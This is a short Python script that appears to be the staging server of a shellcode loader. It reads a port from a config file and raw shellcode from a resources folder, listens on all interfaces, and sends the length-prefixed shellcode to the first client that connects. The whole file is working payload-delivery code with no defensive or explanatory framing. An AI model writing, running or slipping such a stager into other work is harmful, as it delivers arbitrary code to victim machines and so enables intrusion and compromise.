import socket
import struct
import json
import os

SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.dirname(SCRIPT_DIR)
HOST = '0.0.0.0'

fpathConfig = PROJECT_ROOT + r'\resources\config.json'
fpathShellcode = PROJECT_ROOT + r'\resources\shellcode.bin'

with open(fpathConfig, "r") as f:
    conf = json.load(f)
PORT = conf["port"]

with open(fpathShellcode, 'rb') as f:
    shellcode = f.read()
shellcode = struct.pack("<I", len(shellcode)) + shellcode

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(5)
print(f"Socket is listening: Port {PORT}")
while True:
    conn, addr = s.accept()
    print(f"Connection from {addr[0]} (Port: {addr[1]})")
    conn.sendall(shellcode)
    conn.close()
    print(f"Shellcode sent")
    break